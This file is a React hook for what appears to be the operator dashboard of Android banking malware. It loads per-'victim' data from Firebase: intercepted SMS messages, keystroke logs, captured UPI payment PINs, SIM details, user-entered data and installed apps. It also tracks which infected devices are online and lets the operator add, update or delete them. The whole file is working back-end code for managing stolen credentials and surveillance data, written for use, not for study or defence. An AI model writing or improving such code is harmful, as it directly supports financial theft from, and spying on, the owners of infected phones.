import { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import { DeviceInfo, Message, SimRow, KeyLog, UserEntered, AppsInstalled } from '@/data/db';
import { firebaseService } from '@/lib/firebaseService';
import { parseTime, formatTime } from '@/utils/time';
import { 
  validateDevices, 
  validateMessages, 
  validateSims, 
  validateKeyLogs, 
  validateUPIPins,
  validateUserEnteredData
} from '@/utils/dataValidation';

// Import mock data as fallback
import { DB } from '@/data/db';

// Performance optimization: Cache for expensive operations
const cache = new Map<string, { data: any; timestamp: number; ttl: number }>();
const CACHE_TTL = 5 * 60 * 1000; // 5 minutes

// Performance optimization: Debounce function
function debounce<T extends (...args: any[]) => any>(func: T, wait: number): T {
  let timeout: NodeJS.Timeout;
  return ((...args: any[]) => {
    clearTimeout(timeout);
    timeout = setTimeout(() => func.apply(null, args), wait);
  }) as T;
}

// Performance optimization: Throttle function
function throttle<T extends (...args: any[]) => any>(func: T, limit: number): T {
  let inThrottle: boolean;
  return ((...args: any[]) => {
    if (!inThrottle) {
      func.apply(null, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  }) as T;
}

export function useDBOptimized() {
  const [db, setDb] = useState<{
    DeviceInfo: Record<string, DeviceInfo>;
    Messages: Record<string, Message>;
    SMSData: Record<string, Message>;
    Sims: Record<string, SimRow[]>;
    KeyLogs: Record<string, KeyLog[]>;
    UPIPins: Record<string, Array<{ pin: string; timestamp: string }>>;
    UserEntered: Record<string, UserEntered>;
    AppsInstalled: Record<string, AppsInstalled>;
  }>({
    DeviceInfo: {},
    Messages: {},
    SMSData: {},
    Sims: {},
    KeyLogs: {},
    UPIPins: {},
    UserEntered: {},
    AppsInstalled: {}
  });

  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [initialized, setInitialized] = useState(false);
  const [loadingStates, setLoadingStates] = useState({
    devices: true,
    messages: false,
    sims: false,
    keylogs: false,
    upis: false
  });

  // Performance optimization: Refs to prevent unnecessary re-renders
  const listenersRef = useRef<(() => void)[]>([]);
  const abortControllerRef = useRef<AbortController | null>(null);

  // Performance optimization: Cache management
  const getCachedData = useCallback((key: string) => {
    const cached = cache.get(key);
    if (cached && Date.now() - cached.timestamp < cached.ttl) {
      return cached.data;
    }
    cache.delete(key);
    return null;
  }, []);

  const setCachedData = useCallback((key: string, data: any, ttl: number = CACHE_TTL) => {
    cache.set(key, { data, timestamp: Date.now(), ttl });
  }, []);

  // Performance optimization: Optimized data loading with caching
  const loadDataWithCache = useCallback(async (key: string, loader: () => Promise<any>, ttl?: number) => {
    const cached = getCachedData(key);
    if (cached) {
      return cached;
    }

    try {
      const data = await loader();
      setCachedData(key, data, ttl);
      return data;
    } catch (error) {
      console.error(`Error loading ${key}:`, error);
      throw error;
    }
  }, [getCachedData, setCachedData]);

  // Performance optimization: Initialize with essential data only
  useEffect(() => {
    if (initialized) return;
    
    const initializeData = async () => {
      try {
        setLoading(true);
        setError(null);

        // Cancel any ongoing requests
        if (abortControllerRef.current) {
          abortControllerRef.current.abort();
        }
        abortControllerRef.current = new AbortController();

        // Load only essential data initially
        const [rawDevices, rawSMSData] = await Promise.all([
          loadDataWithCache('devices', () => firebaseService.getDevices()),
          loadDataWithCache('smsData', () => firebaseService.getSMSData())
        ]);

        const validatedDevices = validateDevices(rawDevices);
        const validatedMessages = validateMessages(rawSMSData);

        setDb({
          DeviceInfo: validatedDevices,
          Messages: {},
          SMSData: validatedMessages,
          Sims: {},
          KeyLogs: {},
          UPIPins: {},
          UserEntered: {},
          AppsInstalled: {}
        });

        setLoadingStates(prev => ({ ...prev, devices: false }));
        setInitialized(true);
      } catch (err) {
        console.error('Error initializing data:', err);
        setError('Failed to load data from Firebase');
        
        // Fallback to mock data
        setDb({
          DeviceInfo: DB.DeviceInfo,
          Messages: {},
          SMSData: DB.Messages,
          Sims: DB.Sims,
          KeyLogs: DB.KeyLogs,
          UPIPins: DB.UPIPins,
          UserEntered: DB.UserEntered,
          AppsInstalled: DB.AppsInstalled
        });
        setInitialized(true);
      } finally {
        setLoading(false);
      }
    };

    initializeData();

    // Cleanup
    return () => {
      if (abortControllerRef.current) {
        abortControllerRef.current.abort();
      }
    };
  }, [initialized, loadDataWithCache]);

  // Performance optimization: Throttled real-time listeners
  useEffect(() => {
    if (loading) return;

    const throttledDeviceUpdate = throttle((devices: Record<string, DeviceInfo>) => {
      const validated = validateDevices(devices);
      setDb((prev) => ({ ...prev, DeviceInfo: validated }));
    }, 1000);

    const throttledSMSUpdate = throttle((messages: Record<string, Message>) => {
      const validated = validateMessages(messages);
      setDb((prev) => ({ ...prev, SMSData: validated }));
    }, 1000);

    // Set up real-time listeners
    const unsubscribeDevices = firebaseService.onDevicesUpdate(throttledDeviceUpdate);
    const unsubscribeSMSData = firebaseService.onSMSDataUpdate(throttledSMSUpdate);

    listenersRef.current = [unsubscribeDevices, unsubscribeSMSData];

    return () => {
      listenersRef.current.forEach(unsub => unsub && unsub());
    };
  }, [loading]);

  // Performance optimization: Lazy loading with caching
  const loadMessages = useCallback(async () => {
    if (Object.keys(db.SMSData).length > 0) return;
    
    setLoadingStates(prev => ({ ...prev, messages: true }));
    
    try {
      const data = await loadDataWithCache('messages', () => firebaseService.getSMSData());
      const validated = validateMessages(data);
      setDb(prev => ({ ...prev, SMSData: validated }));
    } catch (err) {
      console.error('Error loading messages:', err);
    } finally {
      setLoadingStates(prev => ({ ...prev, messages: false }));
    }
  }, [db.SMSData, loadDataWithCache]);

  const loadSims = useCallback(async (victimId: string) => {
    if (db.Sims[victimId]) return db.Sims[victimId];
    
    setLoadingStates(prev => ({ ...prev, sims: true }));
    
    try {
      const data = await loadDataWithCache(`sims-${victimId}`, () => firebaseService.getSims(victimId));
      const validated = validateSims(data);
      
      setDb(prev => ({
        ...prev,
        Sims: { ...prev.Sims, [victimId]: validated }
      }));
      return validated;
    } catch (err) {
      console.error('Error loading SIMs:', err);
      return db.Sims[victimId] || [];
    } finally {
      setLoadingStates(prev => ({ ...prev, sims: false }));
    }
  }, [db.Sims, loadDataWithCache]);

  const loadKeyLogs = useCallback(async (victimId: string, limit: number = 100) => {
    if (db.KeyLogs[victimId]) return db.KeyLogs[victimId].slice(0, limit);
    
    setLoadingStates(prev => ({ ...prev, keylogs: true }));
    
    try {
      const data = await loadDataWithCache(`keylogs-${victimId}-${limit}`, () => firebaseService.getKeyLogs(victimId, limit));
      const validated = validateKeyLogs(data);
      
      setDb(prev => ({
        ...prev,
        KeyLogs: { ...prev.KeyLogs, [victimId]: validated }
      }));
      return validated;
    } catch (err) {
      console.error('Error loading key logs:', err);
      return db.KeyLogs[victimId] || [];
    } finally {
      setLoadingStates(prev => ({ ...prev, keylogs: false }));
    }
  }, [db.KeyLogs, loadDataWithCache]);

  const loadUPIPins = useCallback(async (victimId: string) => {
    if (db.UPIPins[victimId]) return db.UPIPins[victimId];
    
    setLoadingStates(prev => ({ ...prev, upis: true }));
    
    try {
      const data = await loadDataWithCache(`upis-${victimId}`, () => firebaseService.getUPIPins(victimId));
      const validated = validateUPIPins(data);
      
      setDb(prev => ({
        ...prev,
        UPIPins: { ...prev.UPIPins, [victimId]: validated }
      }));
      return validated;
    } catch (err) {
      console.error('Error loading UPI pins:', err);
      return db.UPIPins[victimId] || [];
    } finally {
      setLoadingStates(prev => ({ ...prev, upis: false }));
    }
  }, [db.UPIPins, loadDataWithCache]);

  // Performance optimization: Memoized data accessors
  const getVictimMessages = useCallback((victimId: string): Message[] => {
    return Object.values(db.SMSData)
      .filter((msg) => msg.VictimId === victimId)
      .sort((a, b) => parseTime(b.Time).getTime() - parseTime(a.Time).getTime());
  }, [db.SMSData]);

  const getAllMessages = useCallback((): Message[] => {
    return Object.values(db.SMSData).sort(
      (a, b) => parseTime(b.Time).getTime() - parseTime(a.Time).getTime()
    );
  }, [db.SMSData]);

  const getRecentMessages = useCallback((limit: number = 5): Message[] => {
    return Object.values(db.SMSData)
      .sort((a, b) => parseTime(b.Time).getTime() - parseTime(a.Time).getTime())
      .slice(0, limit);
  }, [db.SMSData]);

  const getVictimMessageCount = useCallback((victimId: string): number => {
    return Object.values(db.SMSData)
      .filter((msg) => msg.VictimId === victimId)
      .length;
  }, [db.SMSData]);

  // Performance optimization: Memoized KPIs
  const getKPIs = useMemo(() => {
    const devices = Object.values(db.DeviceInfo);
    const totalDevices = devices.length;
    const onlineDevices = devices.filter((device) => (device.Status || '').toLowerCase() === 'online').length;
    const offlineDevices = Math.max(totalDevices - onlineDevices, 0);

    return {
      totalDevices,
      onlineDevices,
      offlineDevices
    };
  }, [db.DeviceInfo]);

  // Performance optimization: Debounced Firebase operations
  const updateDevice = useCallback(debounce(async (deviceId: string, updates: Partial<DeviceInfo>) => {
    try {
      await firebaseService.updateDevice(deviceId, updates);
      // Invalidate cache
      cache.delete('devices');
    } catch (err) {
      console.error('Error updating device:', err);
      throw err;
    }
  }, 300), []);

  const addDevice = useCallback(async (deviceId: string, deviceInfo: DeviceInfo) => {
    try {
      const deviceWithAdded: DeviceInfo = {
        ...deviceInfo,
        Added: deviceInfo.Added || formatTime(new Date())
      };
      await firebaseService.addDevice(deviceId, deviceWithAdded);
      // Invalidate cache
      cache.delete('devices');
    } catch (err) {
      console.error('Error adding device:', err);
      throw err;
    }
  }, []);

  const deleteDevice = useCallback(async (deviceId: string) => {
    try {
      await firebaseService.deleteDevice(deviceId);
      // Invalidate cache
      cache.delete('devices');
    } catch (err) {
      console.error('Error deleting device:', err);
      throw err;
    }
  }, []);

  // Performance optimization: Cleanup on unmount
  useEffect(() => {
    return () => {
      listenersRef.current.forEach(unsub => unsub && unsub());
      if (abortControllerRef.current) {
        abortControllerRef.current.abort();
      }
      // Clear cache on unmount
      cache.clear();
    };
  }, []);

  return {
    db,
    loading,
    error,
    loadingStates,
    loadMessages,
    loadSims,
    loadKeyLogs,
    loadUPIPins,
    getVictimMessages,
    getAllMessages,
    getRecentMessages,
    getVictimMessageCount,
    getSims: loadSims,
    getKeyLogs: loadKeyLogs,
    getUPIs: loadUPIPins,
    getKPIs,
    addDevice,
    updateDevice,
    deleteDevice
  };
}

